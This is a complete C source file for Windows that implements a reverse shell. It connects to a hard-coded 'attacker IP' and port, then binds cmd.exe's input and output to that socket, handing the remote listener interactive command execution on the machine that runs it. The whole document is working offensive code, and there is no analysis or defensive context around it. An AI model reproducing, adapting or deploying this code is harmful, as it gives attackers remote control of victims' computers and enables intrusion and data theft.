#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <stdlib.h>
#include <ws2tcpip.h>

// Link Winsock library
#pragma comment(lib, "Ws2_32.lib")

int main() {
    // Socket and connection essentials
    SOCKET shell;
    struct sockaddr_in shell_addr;
    WSADATA wsa;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char ip_addr[] = "192.168.1.57"; // Attacker IP
    int port = 1234;                // Listening port

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("Failed to initialize Winsock. Error: %d\n", WSAGetLastError());
        return 1;
    }

    // Create a socket
    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (shell == INVALID_SOCKET) {
        printf("Socket creation failed. Error: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    // Setup shell address structure
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_port = htons(port);
    shell_addr.sin_addr.s_addr = inet_addr(ip_addr);

    // Connect to the attacker's listener
    if (WSAConnect(shell, (struct sockaddr *)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        printf("Failed to connect to the attacker. Error: %d\n", WSAGetLastError());
        closesocket(shell);
        WSACleanup();
        return 1;
    }

    // Configure STARTUPINFO structure for cmd.exe
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)shell;

    // Launch cmd.exe as a child process
    char cmd[] = "cmd.exe";
    if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        printf("Failed to create process. Error: %d\n", GetLastError());
        closesocket(shell);
        WSACleanup();
        return 1;
    }

    // Wait for the process to terminate
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Cleanup
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(shell);
    WSACleanup();

    return 0;
}